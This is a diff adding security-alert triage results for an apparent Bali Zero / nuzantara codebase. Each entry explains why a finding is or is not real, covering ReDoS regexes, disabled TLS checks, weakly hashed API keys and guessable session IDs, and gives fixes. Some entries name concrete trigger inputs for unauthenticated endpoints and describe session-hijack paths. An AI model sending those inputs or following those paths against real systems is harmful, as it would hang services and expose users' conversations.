+   "reason": ".match() only attempts a single match at position 0 \u2014 it does not retry across the string like finditer/search/split do, so the O(n) positions \u00d7 O(n) backoff multiplication that makes PASAL_PATTERN dangerous never occurs. Empirically tested .match() on pure '\\n'*n up to 128,000 chars: clean linear growth (0.0015s at 128000), no blowup, in stark contrast to .split()/.finditer() on the identical pattern.",
+   "fix_hint": "No fix needed."
+  },
+  {
+   "number": 7771,
+   "path": "apps/backend-rag/backend/core/legal/chunker.py",
+   "line": 137,
+   "surface": "backend-prod",
+   "reason": "Same reasoning and same empirical result as #7772: single-position .match() on PASAL_PATTERN is linear, not the vulnerable finditer/split usage.",
+   "fix_hint": "No fix needed."
+  },
+  {
+   "number": 7409,
+   "path": "apps/backend-rag/backend/app/routers/analytics.py",
+   "line": 151,
+   "surface": "backend-prod",
+   "reason": "This is the same email shape as #7482 but WITHOUT the negative lookbehind/lookahead that protects it \u2014 so every one of the O(n) positions in a non-matching string pays the O(n) 'consume-looking-for-@-then-fail' cost. Empirically confirmed genuine O(n\u00b2): n=500\u21920.0005s, n=1000\u21920.0018s, n=2000\u21920.0072s, n=4000\u21920.023s (ratio ~4x for 2x input, both via .search() and .sub()). Reachability is the worst in this batch: `POST /api/analytics/funnel-event` (`ingest_funnel_event` in analytics.py) has NO auth dependency at all and is explicitly documented as 'public, allowlisted' in the module docstring; `FunnelEvent.payload: dict[str, Any]` has no per-string length validator, so an attacker can POST a JSON payload with a long string value containing a crafted 'a@' + many letters + invalid-tld-terminator substring and hang the request handler (and, since scrub_pii recurses over arbitrary nested dict/list values, a single request can trigger this many times over).",
+   "fix_hint": "Bound the quantifiers (e.g. `[A-Za-z0-9.-]{1,63}`), or truncate/cap each payload string value to a fixed max length (e.g. 500 chars) before running _scrub_pii_string, or add a negative-lookbehind guard like receipt_safety.py's EMAIL_PATTERN, or switch to a non-backtracking validator."
+  },
+  {
+   "number": 6285,
+   "path": "scripts/wr2_canva_pdf_render.py",
+   "line": 331,
+   "surface": "tooling",
+   "reason": "(\\d+([,.\\d]+)*[KMB]?) is the textbook (X+)* catastrophic-backtracking shape: the outer group is repeated with * and its inner [,.\\d]+ overlaps the leading \\d+. Empirically confirmed genuinely EXPONENTIAL: '1'+n commas+'!' took 0.002s at n=15, 0.07s at n=20, 2.3s at n=25, and timed out (>8s) at n=30 \u2014 a ~30x jump per +5 chars. Reachability is local-only per the 'tooling' surface (this is a CLI script in the WR2 carousel-render pipeline, run by the operator/cron, not network-exposed), which caps real-world blast radius \u2014 but `text` does flow from LLM-drafted/scraped regulatory-intel carousel captions upstream in the pipeline, so a malformed/adversarial ~30+ character run of digits/commas/dots (plausible in garbled OCR or a corrupted intel feed) could hang a local pipeline run. Marking REAL because the algorithmic defect and a plausible (if not internet-facing) trigger path both exist; severity is materially lower than the backend-prod findings above.",
+   "fix_hint": "Replace the nested quantifier with a single non-overlapping one, e.g. r'\\b(\\d[\\d,.]*[KMB]?)\\s+(\\w+(?:\\s+\\w+){0,1})\\b'."
+  },
+  {
+   "number": 4441,
+   "path": "apps/backend-rag/backend/services/naga/orchestrator.py",
+   "line": 103,
+   "surface": "backend-prod",
+   "reason": "(.+?)\\s+ is ambiguous because '.' also matches space (no DOTALL needed \u2014 plain space isn't excluded), so the lazy group and the mandatory \\s+ overlap over any run of spaces, and failure (no 'e'/'and'/'&' anywhere) forces exhaustive exploration of every split point. Empirically confirmed SEVERE blowup: 'confronto ' + 500 spaces took 2.67s; + 1000 spaces timed out at >10s. This is the single worst-case finding in the batch: `POST /api/naga/research` (start_research in naga.py) has ZERO auth dependency and ZERO length bound on `ResearchRequest.query: str`; `_decompose_query()` is called synchronously (no to_thread) inside `async def research()`, directly on the request-body string, so a single small (~1-2KB) unauthenticated POST can hang the whole nuzantara-rag event loop for minutes.",
+   "fix_hint": "Bound query length in the Pydantic model (Field(max_length=2000) or similar) AND fix the regex \u2014 replace (.+?)\\s+(?:e|and|&)\\s+(.+) with a non-backtracking split (e.g. re.split on a compiled \\s+(?:e|and|&)\\s+ delimiter, or plain str.split), or bound the lazy group to e.g. .{1,200}?."
+  },
+  {
+   "number": 257,
+   "path": "apps/backend-rag/backend/services/memory/memory_fallback.py",
+   "line": 106,
+   "surface": "backend-prod",
+   "reason": "\\d+ with no bound, tried at every character position via .search() when the whole string fails to match anywhere, produces genuine O(n\u00b2): pure '0'*n took 0.03s at n=1000, 0.49s at n=4000 (~16x for 4x), 7.8s at n=16000 (~16x again), timed out at n=64000. `extract_and_save_entities` runs on `content` from InMemoryConversationCache.add_message(conversation_id, 'user', content), which is fed live user chat text via conversation_service.py / the conversations router, used as a fallback path across the live channels (WhatsApp/web chat/etc.) when the primary DB is unavailable \u2014 no evidence of a length cap on raw user message content before this call.",
+   "fix_hint": "Bound the digit run, e.g. \\d{1,15}(?:[.,]\\d{1,15})?, and/or truncate content_lower to a fixed max length (e.g. 2000 chars) before running entity-extraction regexes."
+  },
+  {
+   "number": 7900,
+   "path": "apps/bali-intel-scraper/scripts/unified_scraper.py",
+   "line": 264,
+   "surface": "tooling",
+   "reason": "UnifiedScraper.__init__ (line 127-132) constructs the single shared httpx client with verify=False for the whole class, so every outbound fetch \u2014 including this listing-page fallback fetch at line 264 \u2014 skips TLS certificate validation. The scraper makes real outbound HTTPS requests over the public internet to dozens of Indonesian news domains listed in config/unified_sources.json. A network-path attacker (rogue AP, compromised router/DNS, malicious exit node) can MITM these connections undetected and inject fabricated content, which the scraper ingests as 'intel' feeding Bali Zero's regulatory/immigration knowledge pipeline. Runs locally (surface=tooling) so lower likelihood than a server, but it genuinely traverses the network unauthenticated.",
+   "fix_hint": "Remove verify=False (use default cert validation); if a specific source genuinely needs a relaxed check, isolate it behind a dedicated allow-listed client the way kg_subgraph_property.py does (separate verified/unverified singletons), not a blanket class-wide setting."
+  },
+  {
+   "number": 7899,
+   "path": "apps/bali-intel-scraper/scripts/unified_scraper.py",
+   "line": 202,
+   "surface": "tooling",
+   "reason": "Same root cause as #7900 \u2014 the class-wide httpx.AsyncClient has verify=False; this call site is the primary listing-page fetch inside extract_articles_from_source. Same MITM exposure and same fix.",
+   "fix_hint": "Same as #7900 \u2014 fix once at the client construction site (line 127-132), which resolves all three alerts."
+  },
+  {
+   "number": 7898,
+   "path": "apps/bali-intel-scraper/scripts/unified_scraper.py",
+   "line": 165,
+   "surface": "tooling",
+   "reason": "Same root cause as #7900/#7899 \u2014 the shared client with verify=False. This is the RSS-feed fetch path, hit for every configured source before falling back to listing scraping.",
+   "fix_hint": "Same as #7900 \u2014 single fix at the client constructor covers all three."
+  },
+  {
+   "number": 7483,
+   "path": "apps/backend-rag/backend/services/autonomous_lab/receipt_safety.py",
+   "line": 31,
+   "surface": "backend-prod",
+   "reason": "safe_sha256_fingerprint() is a generic redaction helper: any string flagged as receipt-sensitive (by regexes matching secrets, emails, phones, WhatsApp handles \u2014 one of those regexes literally contains the substring 'password' as a keyword pattern, which is almost certainly what triggered CodeQL's 'sensitive data (password)' heuristic) gets replaced by this short fingerprint so raw secrets never land in a persisted receipt. It is a one-way redaction/correlation token, not a credential-verification hash, and the docstring explicitly says the output should be 'useful but not secret-like' \u2014 i.e. reversibility is an accepted tradeoff for a diagnostic aid, not a security boundary.",
+   "fix_hint": "None required for correctness; if defense-in-depth is wanted, could add a static per-deploy pepper before hashing to blunt dictionary attacks on short/common secrets."
+  },
+  {
+   "number": 4670,
+   "path": "apps/backend-rag/backend/app/services/api_key_auth.py",
+   "line": 318,
+   "surface": "backend-prod",
+   "reason": "api_key here originates from settings.api_keys (APIKeyAuth.__init__, line 71-72) \u2014 a comma-separated, operator-configured environment variable of static, human-chosen strings (this repo's documented convention uses brand-style secrets like 'zantara-secret-2024', not cryptographically random tokens; grepping the codebase found no secrets.token_* generator feeding api_key_records \u2014 the only insert path is this legacy-key auto-migration). SHA-256 with no salt/pepper and no work factor is cheap to brute-force offline (billions/sec on commodity GPUs); if the api_key_records table or a DB backup ever leaks, an attacker can dictionary/brute-force these low-to-medium-entropy pre-shared keys and replay the recovered plaintext to authenticate against the live backend-prod API (potentially as admin, since role is resolved by key identity).",
+   "fix_hint": "Hash with HMAC-SHA256 keyed by a server-side secret/pepper (not derivable from the DB alone), or migrate to a proper KDF (argon2/scrypt/bcrypt) if per-request latency budget allows; at minimum add a fixed application-level pepper so a bare DB leak isn't sufficient to crack keys."
+  },
+  {
+   "number": 4669,
+   "path": "apps/backend-rag/backend/app/services/api_key_auth.py",
+   "line": 270,
+   "surface": "backend-prod",
+   "reason": "Same weak-hash-of-low-entropy-static-key issue as #4670 \u2014 this is the lookup side (resolve_role_from_db), executed on every incoming request carrying an API key that isn't in the in-memory legacy map, i.e. it's on the live authentication path (backend-prod, network-reachable).",
+   "fix_hint": "Same fix as #4670 \u2014 must be applied consistently at both the insert (line 318) and lookup (line 270) sites since they must compute the same hash."
+  },
+  {
+   "number": 4657,
+   "path": "apps/backend-rag/backend/services/rag/kg_subgraph_property.py",
+   "line": 122,
+   "surface": "backend-prod",
+   "reason": "_fetch_badung_provider explicitly requests the module's `_client_unverified` singleton (verify=False, with a code comment justifying it as 'Badung DPUPR uses self-signed cert'). This genuinely disables TLS certificate validation for this specific external government API call. An on-path attacker can tamper with the returned zoning GeoJSON, which feeds property/zoning answers (Hak Pakai/HGB/villa leasehold) that this KG subgraph gives to real Bali Zero clients \u2014 a data-integrity risk with real business consequence (the exact class of issue the cicatrix #3 'villa-leasehold zoning' scars already flag).",
+   "fix_hint": "Pin the specific self-signed certificate (fetch and pin its fingerprint / bundle a dedicated CA cert for this one host) instead of disabling verification outright, so only that host's exact known cert is trusted."
+  },
+  {
+   "number": 7317,
+   "path": "apps/web/src/lib/api/client.ts",
+   "line": 81,
+   "surface": "other-app",
+   "reason": "sessionId flows into `fetch(`${baseUrl}/api/session/${encodeURIComponent(sessionId)}`, {method:'DELETE'})`. Verified the actual backend: apps/graph-engine/src/nuzantara_graph/api/routes.py `DELETE /api/session/{id}` and services/conversation_memory.py store conversation turns in Redis keyed ONLY by session_id (`v6:session:{session_id}`, docstring: 'Stores conversation history per session_id', no user field at all). apps/graph-engine/src/nuzantara_graph/api/middleware.py::get_current_user treats a missing/absent Bearer token as valid anonymous access (auth is optional). So session_id IS the sole access-control token protecting up to 24h of another user's multi-turn conversation (load/append/clear), and it is generated with Math.random(), which is guessable/predictable. An attacker who predicts another visitor's session_id can clear or (via /api/query) read/append their conversation.",
+   "fix_hint": "Generate session_id with crypto.randomUUID(); separately, the graph-engine session/conversation-memory endpoints should scope by an authenticated identity, not session_id alone."
+  },
+  {
+   "number": 4505,
+   "path": "apps/mouth/src/lib/visa-oracle/storage.ts",
+   "line": 21,
+   "surface": "frontend-prod",
+   "reason": "sessionId is stored client-side and passed as VisaChat's sessionIdRef, sent as `session_id` to POST /api/visa-oracle/chat and /recommend (apps/backend-rag/backend/app/routers/visa_oracle.py) \u2014 neither route has Depends(get_current_user); they are fully anonymous. `_fetch_session_snapshot()` (visa_oracle.py ~745-767) and message persistence key strictly by `WHERE session_id = $1` with no secondary check (e.g. IP hash is stored but not verified on read). A guessed/predicted session_id lets an attacker retrieve another visitor's visa-eligibility quiz answers, recommended visas, and chat transcript.",
+   "fix_hint": "Use crypto.randomUUID() for the client session id; consider binding session_id to a signed/HMAC value or short-lived cookie server-side so it can't be forged/guessed independently of what the visitor was issued."
+  },
+  {
+   "number": 2874,
+   "path": "apps/mouth/src/components/ZantaraWidget.tsx",
+   "line": 160,
+   "surface": "frontend-prod",
+   "reason": "`session_id: sessionId.current` is sent in the POST body to /api/agentic-rag/stream. Verified apps/backend-rag/backend/app/routers/agentic_rag.py: for unauthenticated callers `authenticated_user_id = f\"anonymous_{session_id[:12]}\"` (a deterministic function of session_id itself), and `get_conversation_history_for_agentic()`'s `elif session_id:` branch runs `SELECT messages FROM conversations WHERE session_id = $1` with NO user_id filter at all (unlike the conversation_id/default branches in the same function, which do filter by user_id). So guessing another anonymous visitor's session_id gives full read access to their in-progress conversation with the public chat widget \u2014 which per this file's own docstring is designed to elicit contact info for CRM lead creation.",
+   "fix_hint": "crypto.randomUUID() for visitor session id; fix the backend `elif session_id:` branch in get_conversation_history_for_agentic to also filter by user_id/anonymous-derived-id (it already does for the other two branches in the same function)."
+  },
+  {
+   "number": 2873,
+   "path": "apps/mouth/src/components/ZantaraWidget.tsx",
+   "line": 159,
+   "surface": "frontend-prod",
+   "reason": "Same taint source/sink as alert 2874 \u2014 `user_id: sessionId.current` on the same fetch body to /api/agentic-rag/stream, which per agentic_rag.py directly seeds `authenticated_user_id` for anonymous callers and the unscoped session_id-only DB lookup. Same exploit path as 2874 (this is the twin line of the same object literal).",
+   "fix_hint": "Same as 2874 \u2014 crypto.randomUUID() client-side, and scope the backend history lookup by user_id, not session_id alone."
+  },
+  {
+   "number": 2543,
+   "path": "apps/web/src/hooks/useChatPage.ts",
+   "line": 75,
+   "surface": "other-app",
+   "reason": "`sessionIdRef.current` (Math.random-derived) flows into `graph.execute(query, {session_id: sessionIdRef.current})` \u2192 graphClient.queryStream \u2192 POST /api/query on the graph-engine backend. Same verified vulnerable sink as alert 7317: apps/graph-engine conversation_memory.py stores/loads history keyed only by `v6:session:{session_id}` in Redis, and auth is optional on that route. Guessable session_id gives cross-session read/write of another user's multi-turn conversation context.",
+   "fix_hint": "crypto.randomUUID(); backend should key conversation memory by an authenticated identity, not raw session_id."
+  },
+  {
+   "number": 2153,
+   "path": "apps/mouth/src/hooks/useOptimisticChat.ts",
+   "line": 70,
+   "surface": "frontend-prod",
+   "reason": "`sessionId` state is passed into `sendMessageStream(newMessages, sessionId, userId)` (stream-helper.ts) \u2192 `api.sendMessageStreaming(message, sessionId, ...)` (chat.api.ts) \u2192 POST /api/agentic-rag/stream. Verified this hits the same vulnerable `get_conversation_history_for_agentic()` `elif session_id:` branch in agentic_rag.py described above (no user_id filter). A guessed session_id lets an attacker inject the target's prior conversation turns into their own query context / read them back.",
+   "fix_hint": "crypto.randomUUID(); fix the shared backend function's session_id-only branch to also filter on authenticated_user_id."
+  },
+  {
+   "number": 2150,
+   "path": "apps/mouth/src/hooks/useConversationPersistence.ts",
+   "line": 78,
+   "surface": "frontend-prod",
+   "reason": "This hook's sessionId is consumed by apps/mouth/src/hooks/useChatPage.ts (mouth's own page hook, distinct from apps/web's) which threads it through useChatSend.ts into the same api.sendMessageStreaming(...) \u2192 POST /api/agentic-rag/stream path verified vulnerable above (get_conversation_history_for_agentic's unscoped session_id branch). Same exploit class as 2153/17.",
+   "fix_hint": "crypto.randomUUID(); backend fix as noted above is the real remediation."
+  },
+  {
+   "number": 20,
+   "path": "apps/mouth/src/hooks/useConversationPersistence.ts",
+   "line": 94,
+   "surface": "frontend-prod",
+   "reason": "Same sink chain as alert 2150 (this hook \u2192 mouth useChatPage.ts \u2192 useChatSend.ts \u2192 /api/agentic-rag/stream, unscoped session_id lookup in agentic_rag.py). This is just the reset-session call site of the identical vulnerable generator.",
+   "fix_hint": "crypto.randomUUID(); backend fix as noted above."
+  },
+  {
+   "number": 18,
+   "path": "apps/mouth/src/hooks/useConversationPersistence.ts",
+   "line": 63,
+   "surface": "frontend-prod",
+   "reason": "Same sink chain as 2150/20 \u2014 this is the primary new-session creation call site feeding the same vulnerable /api/agentic-rag/stream session_id-only history lookup.",
+   "fix_hint": "crypto.randomUUID(); backend fix as noted above."
+  },
+  {
+   "number": 17,
+   "path": "apps/mouth/src/hooks/useChat.ts",
+   "line": 44,
+   "surface": "frontend-prod",
+   "reason": "sessionId is passed into useChatStreaming({sessionId,...}) whose sendStreamingMessage ultimately calls api.sendMessageStreaming (verified in chat.api.ts) \u2192 POST /api/agentic-rag/stream, hitting the same unscoped `elif session_id:` branch in get_conversation_history_for_agentic (agentic_rag.py) documented above. Same exploit class.",
+   "fix_hint": "crypto.randomUUID(); backend fix as noted above."
+  },
+  {
+   "number": 2869,
+   "path": "apps/backend-rag/backend/app/routers/crm_enhanced.py",
+   "line": 67,
+   "surface": "backend-prod",
+   "reason": "The 'https://www.googleapis.com/drive/v3/files/' prefix is a hardcoded literal, not user-derived. file_id traces back to DocumentCreate.file_id, a client-supplied JSON body field (line 948) flowing through _dispatch_ocr_by_folder \u2192 _auto_ocr_* helpers \u2192 _download_drive_file(file_id). It only fills a trailing path segment on a fixed Google host \u2014 no ability to redirect the request elsewhere, so not SSRF. (Separate, non-SSRF concern: since this uses a shared ServiceAccountDriveService rather than the caller's own OAuth token, a user could supply an arbitrary file_id belonging to a Drive object outside their intended scope \u2014 an IDOR risk worth its own ticket, not this SSRF rule.)",
+   "fix_hint": "For the IDOR angle (not this alert): verify file_id belongs to a document/client the requesting user is authorized to access before downloading."
+  },
+  {
+   "number": 2868,
+   "path": "apps/backend-rag/backend/app/routers/crm_enhanced.py",
+   "line": 57,
+   "surface": "backend-prod",
+   "reason": "Same function/host/taint chain as 2869 (the metadata fetch immediately preceding the content download). Host is the same hardcoded googleapis.com literal; file_id only fills a path segment. Not exploitable as SSRF for the same reasons.",
+   "fix_hint": "Same as 2869."
+  },
+  {
+   "number": 792,
+   "path": "apps/backend-rag/backend/app/routers/documents_proxy.py",
+   "line": 144,
+   "surface": "backend-prod",
+   "reason": "file_id is a FastAPI Path param on GET /thumbnail/{file_id} (line 121-123), so user-controlled, but the 'https://www.googleapis.com/drive/v3/files/' prefix is a hardcoded literal in the source \u2014 never derived from the request. Only the trailing path segment is tainted; no ability to redirect the request off Google's API host. (Same non-SSRF IDOR caveat as crm_enhanced.py: this endpoint uses a shared ServiceAccountDriveService rather than the caller's own scoped credentials.)",
+   "fix_hint": "IDOR-angle only (separate from SSRF): verify the requesting user is authorized to view file_id before proxying it."
+  },
+  {
+   "number": 791,
+   "path": "apps/backend-rag/backend/app/routers/documents_proxy.py",
+   "line": 75,
+   "surface": "backend-prod",
+   "reason": "Same proxy_drive_file() function/host/taint chain as 792 (metadata fetch preceding the content download at line 93-97, both flagged together \u2014 hence the doubled message in the alert). file_id from Path param, hardcoded googleapis.com prefix. Not exploitable as SSRF for the same reason: only the trailing segment is tainted, host is fixed.",
+   "fix_hint": "Same as 792."
+  }
+ ],
+ "uncertain": [
+  {
+   "number": 291,
+   "path": "apps/evaluator/test_embedding.py",
+   "line": 50,
+   "reason": "Prints the first 20 characters of a real OpenAI API key (a larger fraction than the 4-10 char masking seen elsewhere in this codebase). It is a local diagnostic script the operator runs with a key they already hold, so no new party learns the secret directly \u2014 but the amount revealed is large enough, and this org has a prior scar (W75/#4 'secret in the clear') around exactly this kind of terminal/log secret exposure, that I can't confidently call it safe if the output is ever captured/shared/logged."
+  },
+  {
+   "number": 290,
+   "path": "apps/evaluator/test_embedding.py",
+   "line": 33,
+   "reason": "Same 20-char-prefix exposure of a real OpenAI key as #291, same file. Local-only tool but a larger fraction of the secret than other masked examples in this repo \u2014 leaving open rather than asserting it's safe."
+  }
+ ]
+}
